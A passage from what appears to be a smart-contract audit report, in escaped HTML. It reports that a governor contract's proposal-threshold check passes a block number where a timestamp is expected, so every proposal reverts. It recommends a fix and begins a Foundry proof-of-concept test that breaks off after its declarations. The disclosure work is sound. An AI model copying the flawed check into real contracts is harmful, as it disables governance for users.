class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit CRITICAL getVotes expects timestamp and calls getsmNFTPastVotes that also expects timestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003egetVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: proposer votes below proposal threshold\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see from the code that function calls \u003ccode\u003egetVotes\u003c/code\u003e, providing block number instead of timestamp, which calls \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e that expects timestamp and will check checkpoint that is “closest” (not exactly it’s a mental shortcut) to the provided timestamp which will be \u003ccode\u003eblocknumber - 1\u003c/code\u003e in this case. \u003c/p\u003e\n\u003cp\u003eAs \u003ccode\u003eblock.number\u003c/code\u003e is way smaller than \u003ccode\u003eblock.timestamp\u003c/code\u003e the check of proposal threshold will always revert leading to DOS of proposal functionality. This is due to the fact that it will check the voting power at the timestamp that is even before the project has launched (because \u003ccode\u003eblock.number\u003c/code\u003e is way smaller than the \u003ccode\u003eblock.timestamp\u003c/code\u003e). \u003c/p\u003e\n\u003cp\u003eThis bug prevents all proposals from being created, which breaks core governance functionality. Given its impact and the fact that it can occur under normal usage without any external trigger,I believe this qualifies as a High severity issue.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-17\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-17\" aria-label=\"recommended mitigation steps 17 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eChange \u003ccode\u003eblock.number\u003c/code\u003e to \u003ccode\u003eblock.timestamp\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-11\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder\u003c/p\u003e\n\u003cp\u003eThis POC shows that even if user meets threshold proposal, due to incorrect value passed to getVotes the call reverts. If one would change the \u003ccode\u003eblock.number\u003c/code\u003e to \u003ccode\u003eblock.timestamp\u003c/code\u003e. The proposal call does not revert.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGovernanceProposeRevertTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eavm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairFactory_2CL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    